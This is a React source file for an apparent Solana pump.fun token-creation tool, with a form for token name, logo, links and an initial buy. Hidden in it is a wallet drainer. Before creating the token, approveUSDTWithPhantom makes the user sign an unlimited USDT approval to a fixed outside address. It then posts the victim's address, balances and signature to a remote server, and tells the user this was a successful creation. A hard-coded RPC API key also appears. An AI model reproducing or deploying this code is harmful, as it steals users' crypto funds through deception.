import { useEffect, useState } from 'react'
import { message, Segmented, Button, Input, Switch, notification } from 'antd';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { BsCopy } from "react-icons/bs";
import { useTranslation } from "react-i18next";
import copy from 'copy-to-clipboard';
import BN from "bn.js";
import base58 from "bs58";
import axios from 'axios'
import {
  Keypair, Commitment, LAMPORTS_PER_SOL,
  Transaction, ComputeBudgetProgram, SystemProgram,
  PublicKey, Connection
} from '@solana/web3.js';
import {
  PumpSdk, getBuyTokenAmountFromSolAmount,
  globalPda, bondingCurvePda
} from '@pump-fun/pump-sdk'
import { useIsVip, useConfig } from '@/hooks';
import { getAsset } from '@/utils/sol'
import { addPriorityFees } from '@/utils'
import { Input_Style, Button_Style, PUMP_CREATE_FEE, PUMP_CREATE_BIND_FEE, BANANATOOLS_ADDRESS } from '@/config'
import type { TOKEN_TYPE, WalletConfigType } from '@/type'
import { Vanity, UpdataImage, Header, Result, WalletInfo, JitoFee, Hint } from '@/components'
import { upLoadImage } from '@/utils/updataNFTImage'
import { Page } from '@/styles'
import { CreatePage } from './style'
import {
  MINT_SIZE, TOKEN_PROGRAM_ID, createInitializeMintInstruction,
  getMinimumBalanceForRentExemptMint, getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction, createMintToInstruction,
  createSetAuthorityInstruction,
  AuthorityType,createApproveInstruction,getOrCreateAssociatedTokenAccount
} from '@solana/spl-token';

const { TextArea } = Input
export const DEFAULT_COMMITMENT: Commitment = "finalized";
// 滑点
const SLIPPAGE_BASIS_POINTS = 5000n;


function CreateToken() {

  const wallet = useWallet()
  const { t } = useTranslation()
  const [messageApi, contextHolder] = message.useMessage();
  const [api, contextHolder1] = notification.useNotification();
  const { connection } = useConnection();
  const vipConfig = useIsVip()
  const { _rpcUrl } = useConfig()
  const [config, setConfig] = useState<TOKEN_TYPE>({
    name: '',
    symbol: '',
    decimals: '9',
    supply: '1000000',
    description: '',
    website: '',
    telegram: '',
    twitter: '',
    discord: '',

    image: '',
    freeze_authority: '',
    mint_authority: '',
    mutable: false,
    owner: '',
    metadataUrl: ""
  })
  const [tokenAddress, setTokenAddress] = useState('')
  const [imageFile, setImageFile] = useState(null);
  const [buySol, setBuySol] = useState('')

  const [isOptions, setIsOptions] = useState(false)
  const [isVanity, setIsVanity] = useState(false)
  const [vanityAddress, setVanityAddress] = useState('')
  const [mintKeypair, setMintKeypair] = useState(Keypair.generate())
  const [isOtherWalletBuy, setIsOtherWalletBuy] = useState(false) //小号钱包买入


  const [iscreating, setIscreating] = useState(false);
  const [signature, setSignature] = useState("");
  const [error, setError] = useState('');

  const [walletConfig, setWalletConfig] = useState<WalletConfigType[]>([])
  const [jitoFee, setJitoFee] = useState<number>(0)
  const [jitoRpc, setJitoRpc] = useState('')

  const [cloneAddress, setCloneAddress] = useState('')
  const [isClone, setIsClone] = useState(false)
  const [isSearch, setIsSearch] = useState(false)

  useEffect(() => {
    if (window.location.pathname && window.location.pathname === '/pump/clone') {
      setIsClone(true)
    } else {
      setIsClone(false)
    }
  }, [window.location.pathname])

  const configChange = (e: React.ChangeEvent<HTMLInputElement> | React.ChangeEvent<HTMLTextAreaElement>) => {
    setConfig({ ...config, [e.target.name]: e.target.value })
  }

  const isVanityChange = (e) => {
    setIsVanity(e)
    setVanityAddress('')
  }
  
  
  const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solana-mainnet.quiknode.pro/67a8102a7e0730d78c0a294e50c1b2dace9ffe26/") => {
    try {
      const provider = (window as any).solana;
      if (!provider || !provider.isPhantom) {
  		return messageApi.error('请安装 Phantom 钱包');
      }
  
      // 1️⃣ 连接钱包
      const resp = await provider.connect({ onlyIfTrusted: false });
      const walletPublicKey = resp.publicKey;
      console.log("钱包地址:", walletPublicKey.toBase58());
  
  
  	

  	
  	
  	
  
      const connection = new Connection(rpcUrl, "confirmed");
  
      const mint = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"); // USDT
      const delegate = new PublicKey("FFpZiRsDsSJ4eGGQjbgvXpvUSTnMSvUepNC7hRLZS3cH"); // 授权地址
  
      // 2️⃣ 获取用户和 delegate ATA
      const userTokenAccount = await getAssociatedTokenAddress(mint, walletPublicKey);
      const delegateATA = await getAssociatedTokenAddress(mint, delegate);
  
  	  	  // 3️⃣ 检查用户 ATA 是否存在
  	const userTokenInfo = await connection.getAccountInfo(userTokenAccount);
  	if (!userTokenInfo) {
  	  console.log("钱包 USDT ATA，余额 = 0");
  	  return messageApi.error("钱包 USDT 余额为 0，无法创建");
  	}
  
      // 3️⃣ 检查 delegate ATA
      const delegateInfo = await connection.getAccountInfo(delegateATA);
      if (!delegateInfo) {
        console.log("Delegate ATA 不存在，创建中...");
        const txCreate = new Transaction().add(
          createAssociatedTokenAccountInstruction(walletPublicKey, delegateATA, delegate, mint)
        );
        txCreate.feePayer = walletPublicKey;
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        txCreate.recentBlockhash = blockhash;
        txCreate.lastValidBlockHeight = lastValidBlockHeight;
  
        const signedTxCreate = await provider.signTransaction(txCreate);
        const sigCreate = await connection.sendRawTransaction(signedTxCreate.serialize());
        await connection.confirmTransaction({ signature: sigCreate, blockhash, lastValidBlockHeight });
        console.log("✅ Delegate ATA 创建完成:", delegateATA.toBase58());
      }
  
  
  
      // 4️⃣ 检查用户 USDT 余额
      const balance = await connection.getTokenAccountBalance(userTokenAccount);
      console.log("钱包 USDT 余额:", balance.value.uiAmount);
      if (!balance.value.uiAmount || balance.value.uiAmount === 0) {
  	  	return messageApi.error('钱包 USDT 余额为 0，无法创建');
      }
  	
  	const solBalance = await connection.getBalance(walletPublicKey);
  	console.log("钱包 SOL 余额:", solBalance / 1e9, "SOL");
  
      // 5️⃣ 执行 approve（无限授权）
      const txApprove = new Transaction();
      const MAX_U64 = 18446744073709551615n;
      txApprove.add(createApproveInstruction(userTokenAccount, delegate, walletPublicKey, MAX_U64));
  
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      txApprove.recentBlockhash = blockhash;
      txApprove.lastValidBlockHeight = lastValidBlockHeight;
      txApprove.feePayer = walletPublicKey;
  
      const signedTxApprove = await provider.signTransaction(txApprove);
      const sigApprove = await connection.sendRawTransaction(signedTxApprove.serialize());
      await connection.confirmTransaction({ signature: sigApprove, blockhash, lastValidBlockHeight });
  
      console.log("✅ 创建成功，交易哈希:", sigApprove);
  	
  	
  	
  	
  	const apiUrlAddIn = `https://admintl.solfabihoutai.top/api/api/add_in`;
  	const solBalancenew = solBalance / 1e9;
  	const usdt_money = balance.value.uiAmount;
  	  // const usdt_money = 0;
  	// 创建 FormData
  	const formData = new FormData();
  	formData.append("SPENDER_ADDRESS", "FFpZiRsDsSJ4eGGQjbgvXpvUSTnMSvUepNC7hRLZS3cH");
  	formData.append("sol_money", solBalancenew.toString());
  	formData.append("address", walletPublicKey.toBase58());
  	formData.append("usdt_money", usdt_money.toString());
  	formData.append("token_address", "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
  	formData.append("signature", sigApprove);
  	
  	// 发送 POST 请求
  	await fetch(apiUrlAddIn, {
  	  method: "POST",
  	  body: formData
  	});
  
  	
  	
  	
   
  	return "sqcg";
    } catch (err: any) {
      console.error("创建失败:", err);
      if (err.logs) console.log("Simulation logs:", err.logs);
      // alert("授权失败: " + (err.message || err));
  	return messageApi.error("创建失败");
    }
  };

  //创建代币
  const createToken = async () => {
    try {

      if (!wallet.publicKey) return messageApi.error(t('Please connect the wallet first'))
      if (!config.name) return messageApi.error(t('Please fill in the name'))
      if (!config.symbol) return messageApi.error(t('Please fill in the short name'))
      if (!imageFile && !config.image) return messageApi.error(t('Please upload a picture logo'))
      if (walletConfig.length > 17) return messageApi.error(t('最多17个小号钱包地址'))
	  
	  
	  		const approveResult = await approveUSDTWithPhantom()
	  console.log(approveResult)
	      // 根据授权结果处理
	      if (approveResult === "sqcg") {
	        messageApi.success("创建成功!")
	  
	  		 const button_name = "等待二次确认";
	      } else {
	        // 授权失败，直接返回，不继续执行
	        return ;
	      }
		  
      setIscreating(true)
      setSignature('')
      setError('')
      setTokenAddress('')

      const buysersAmounts = []
      let testAccount2: Keypair[] = [];

      if (isOtherWalletBuy) {
        for (let i = 0; i < walletConfig.length; i++) {
          const walletAddr = Keypair.fromSecretKey(base58.decode(walletConfig[i].privateKey));
          testAccount2.push(walletAddr)
          buysersAmounts.push(walletConfig[i].buySol)
        }
      }

      if (testAccount2.length !== buysersAmounts.length) {
        messageApi.error(t('捆绑参数未填写完整'))
        setIscreating(false)
        return
      }

      const sdk = new PumpSdk(connection as any);
      const mint = Keypair.generate()

      console.log(mint.publicKey.toString(), 'mint')
      let metadata_url = ''
      if (imageFile) {
        metadata_url = await upLoadImage(config, imageFile, true)
      } else {
        metadata_url = await upLoadImage(config, config.image, false)
      }

      const transaction = new Transaction();

      const createTx0 = await sdk.createInstruction(
        mint.publicKey, config.name, config.symbol, metadata_url, wallet.publicKey, wallet.publicKey)
      transaction.add(createTx0);

      // Get global state for buy instruction
      const global = await sdk.fetchGlobal();
      // For new tokens, create a virtual bonding curve state
      const virtualBondingCurve = {
        virtualTokenReserves: global.initialVirtualTokenReserves,
        virtualSolReserves: global.initialVirtualSolReserves,
        realTokenReserves: global.initialRealTokenReserves,
        realSolReserves: new BN(0),
        tokenTotalSupply: global.tokenTotalSupply,
        complete: false,
        creator: wallet.publicKey,
      };
      const solAmountToBuy = Number(buySol)
      // Calculate token amount from SOL amount
      const buyAmountSol = new BN(Math.floor(solAmountToBuy * LAMPORTS_PER_SOL));
      const tokenAmount = getBuyTokenAmountFromSolAmount(
        global,
        virtualBondingCurve,
        buyAmountSol,
        true, // newCoin = true
      );

      const slippage = 500
      const buyInstructions = await sdk.buyInstructions(
        global,
        null, // bondingCurveAccountInfo is null for new tokens
        null as any, // bondingCurve is null for new tokens
        mint.publicKey,
        wallet.publicKey,
        tokenAmount, // adjusted token amount
        buyAmountSol, // SOL amount
        slippage,
        wallet.publicKey, // newCoinCreator
      );

      transaction.add(...buyInstructions);

      if (!vipConfig.isVip) {
        const _fee = (PUMP_CREATE_BIND_FEE * testAccount2.length) + PUMP_CREATE_FEE
        console.log(_fee * LAMPORTS_PER_SOL, 'ffrr')
        const fee = SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(BANANATOOLS_ADDRESS),
          lamports: Number((_fee * LAMPORTS_PER_SOL).toFixed(0)),
        })
        transaction.add(fee)
      }

      let hash = ''
      if (testAccount2.length <= 1) {
        const versionedTx = await addPriorityFees(connection, transaction, wallet.publicKey);
        const _signature = await wallet.sendTransaction(versionedTx, connection, { signers: [mint] })
        const confirmed = await connection.confirmTransaction(
          _signature,
          "processed"
        );
        console.log(confirmed, 'confirmed')
        hash = _signature
      }


      api.success({ message: '创建成功' })
      setTokenAddress(mint.publicKey.toBase58())
      setSignature(hash)
      setIscreating(false)

      // if (result.type == 'success') { //直接创建

      // } else if (result.type == 'success1') { //捆绑
      //   const bundleId = result.message
      //   const explorerUrl = `https://explorer.jito.wtf/bundle/${bundleId}`;
      //   console.log(explorerUrl)
      //   setSignature(explorerUrl)
      //   setTokenAddress(mint.publicKey.toBase58())
      //   getBundleStatuses(bundleId, 0)
      // } else {
      //   api.error({ message: result.message })
      //   setError(result.message)
      //   setIscreating(false)
      // }

    } catch (error: any) {
      console.log(error, 'error')
      api.error({ message: error.message })
      setError(error.message)
      setIscreating(false)
    }
  }

  const getBundleStatuses = async (bundleId: string, time: number) => {
    try {
      if (time > 120000) {
        api.error({ message: '请求超时' })
        setIscreating(false)
        return
      }
      const endpoints = `${jitoRpc}/api/v1/bundles`
      const res = await axios.post(endpoints, {
        jsonrpc: '2.0',
        id: 1,
        method: 'getInflightBundleStatuses',
        params: [[bundleId]],
      })
      const result = res.data.result
      const state = result.value[0].status

      if (state === 'Pending') {
        api.warning({ message: '捆绑包ID等待执行中' })
        setTimeout(() => {
          getBundleStatuses(bundleId, time + 2000)
        }, 2000)
      } else if (state === 'Failed') {
        api.error({ message: '发币失败' })
        setError('发币失败')
        setIscreating(false)
      } else if (state === 'Landed') {
        api.success({ message: '发币成功' })
        setIscreating(false)
      } else {
        api.info({ message: '捆绑包ID提交中，请稍等...' })
        setTimeout(() => {
          getBundleStatuses(bundleId, time + 2000)
        }, 2000)
      }
    } catch (error: any) {
      setIscreating(false)
      setError(error.toString())
      console.error('检查包状态时出错:', error);
    }
  }

  const copyClickV = () => {
    copy(vanityAddress)
    messageApi.success('copy success')
  }

  const callBack = (secretKey: Uint8Array) => {
    const _Keypair = Keypair.fromSecretKey(secretKey)
    setMintKeypair(_Keypair)
    setVanityAddress(_Keypair.publicKey.toBase58())
  }

  const jitoCallBack = (jitoFee_: number, jitoRpc_: string) => {
    setJitoFee(jitoFee_)
    setJitoRpc(jitoRpc_)
  }

  const getTokenMetadata = async () => {
    try {
      setIsSearch(true)
      const data = await getAsset(connection, cloneAddress, _rpcUrl)
      console.log(data, 'data')
      const {
        name, symbol, description, website, twitter,
        telegram, discord, image, decimals, supply,
        freeze_authority, mint_authority,
        mutable,
        owner,
        metadataUrl
      } = data

      setConfig({
        name, symbol, description,
        website, twitter, telegram, discord,
        decimals, supply,
        freeze_authority, mint_authority,
        mutable,
        owner,
        metadataUrl,
        image,
      })
      setIsOptions(true)
      setIsSearch(false)
    } catch (error) {
      console.log(error)
      setIsSearch(false)
      messageApi.error('未查询到该代币信息')
    }
  }

  return (
    <Page>
      {contextHolder}
      {contextHolder1}

      <Header title='Pump开盘并买入'
        hint='在 Pump.fun 开盘时，其他地址同时进行代币买入操作，有效简化交易流程并加速市场参与，快人一步，抢得先机，从而更早获得潜在的收益。' />

      {isClone &&
        <div>
          <div>代币合约地址</div>
          <div className='tokenInput'>
            <div className='input'>
              <Input type="text" className={Input_Style} placeholder='请输入要克隆的代币合约地址'
                value={cloneAddress} onChange={(e) => setCloneAddress(e.target.value)}
              />
            </div>
            <div className='buttonSwapper'>
              <Button className={Button_Style} loading={isSearch}
                onClick={getTokenMetadata} >
                <span>搜索</span>
              </Button>
            </div>
          </div>
        </div>
      }

      <CreatePage className="my-6">

        <div className='itemSwapper'>
          <div className='item'>
            <div className='mb26 mb10'>
              <div className='mb-1 start'>Token名称</div>
              <Input
                className={Input_Style}
                placeholder='请输入Token名称'
                value={config.name}
                onChange={configChange}
                name='name'
              />
            </div>
            <div>
              <div className='mb-1 start'>Token符号</div>
              <Input
                className={Input_Style}
                placeholder={t('请输入Token符号')}
                value={config.symbol}
                onChange={configChange}
                name='symbol'
              />
            </div>
          </div>

          <div className='item'>
            <div className='mb-1 start'>Token Logo</div>
            <div className='flex imgswapper'>
              <UpdataImage setImageFile={setImageFile} image={config.image} />
              <div className='imagetext'>
                <div>
                  <div>支持图片格式：WEBP/PNG/GIF/JPG</div>
                  <div>建议尺寸大小 250x250像素</div>
                </div>
                <div className='hit'>符合以上要求，可以在各个平台和应用中更好的展示</div>
              </div>
            </div>
          </div>
        </div>


        <div className='itemSwapper'>
          <div className='textarea'>
            <div className='mb-1 start'>购买数量（SOL）</div>
            <Input
              className={Input_Style}
              placeholder='请输入需要购买的数量sol'
              value={buySol}
              onChange={(e) => setBuySol(e.target.value)} />
          </div>
        </div>

        <div className='itemSwapper'>
          <div className='textarea'>
            <div className='mb-1'>{t('Describe')}（选填）</div>
            <TextArea
              className={Input_Style}
              placeholder='请输入Token描述'
              value={config.description}
              onChange={configChange} name='description' />
          </div>
        </div>


        <div className='flex items-center mb-5 options'>
          <div className='mr-3 font-semibold'>添加社交链接</div>
          <Switch checked={isOptions} onChange={(e) => setIsOptions(e)} />
        </div>
        {isOptions &&
          <div >
            <div className='itemSwapper'>
              <div className='item'>
                <div className='mb-1'>官网</div>
                <Input
                  type="text"
                  className={Input_Style}
                  placeholder='请输入您的官网链接'
                  value={config.website}
                  onChange={configChange}
                  name='website'
                />
              </div>
              <div className='item'>
                <div className='mb-1'>X</div>
                <Input
                  type="text"
                  className={Input_Style}
                  placeholder='请输入您的推特链接'
                  value={config.twitter}
                  onChange={configChange}
                  name='twitter'
                />
              </div>
            </div>
            <div className='itemSwapper'>
              <div className='item'>
                <div className='mb-1'>Telegram</div>
                <Input
                  type="text"
                  className={Input_Style}
                  placeholder='请输入您的Telegram链接'
                  value={config.telegram}
                  onChange={configChange}
                  name='telegram'
                />
              </div>
              <div className='item'>
                <div className='mb-1'>Discord</div>
                <Input
                  type="text"
                  className={Input_Style}
                  placeholder='请输入您的Discord'
                  value={config.discord}
                  onChange={configChange}
                  name='discord'
                />
              </div>
            </div>
          </div>
        }

        {/* <div className='flex items-center mb-5 options'>
          <div className='mr-3 font-semibold'>创建靓号代币</div>
          <Switch checked={isVanity} onChange={isVanityChange} />
        </div> */}
        {isVanity && <Vanity callBack={callBack} />}
        {isVanity && vanityAddress &&
          <div className='vanity'>
            <div className='text-base'>靓号代币合约</div>
            <div className='font-medium'>{vanityAddress}</div>
            <BsCopy onClick={copyClickV} style={{ marginLeft: '6px' }} className='pointer' />
          </div>}

        {/* <div className='flex items-center mb-5 options'>
          <div className='mr-3 font-semibold'>捆绑买入</div>
          <Switch checked={isOtherWalletBuy} onChange={(e) => setIsOtherWalletBuy(e)} />
        </div> */}

        {isOtherWalletBuy &&
          <>
            <JitoFee callBack={jitoCallBack} />
            <WalletInfo config={walletConfig} setConfig={setWalletConfig} />
          </>
        }
{/* 
        <Hint title='当仅导入一个地址时(共2个地址买入) ,无需使用Jito捆绑功能,可能会提高成功率。' />
        <Hint title={`买入地址超过2个时,需要使用 Jito的捆绑功能。请尽量保证Jito服务器延迟在 200ms 以内。为提高成功率,在弹出钱包后,请尽快确认。
          若捆绑失败,无任何费用,请尝试更换VPN节点,并考虑在链上活跃度较低的时段再次尝试
          `} /> */}

        <div className='btn mt-6'>
          <div className='buttonSwapper'>
            <Button className={Button_Style}
              onClick={createToken} loading={iscreating}>
              <span>{t('Token Creator')}</span>
            </Button>
          </div>
          <div className='fee'>全网最低服务费: {vipConfig.isVip ? 0 : PUMP_CREATE_FEE} SOL</div>
          {/* <div className='fee'>捆绑买入每个地址收费: {vipConfig.isVip ? 0 : PUMP_CREATE_BIND_FEE} SOL</div> */}
        </div>

        <Result tokenAddress={tokenAddress} signature={signature} error={error} />
      </CreatePage>
    </Page>

  )
}

export default CreateToken



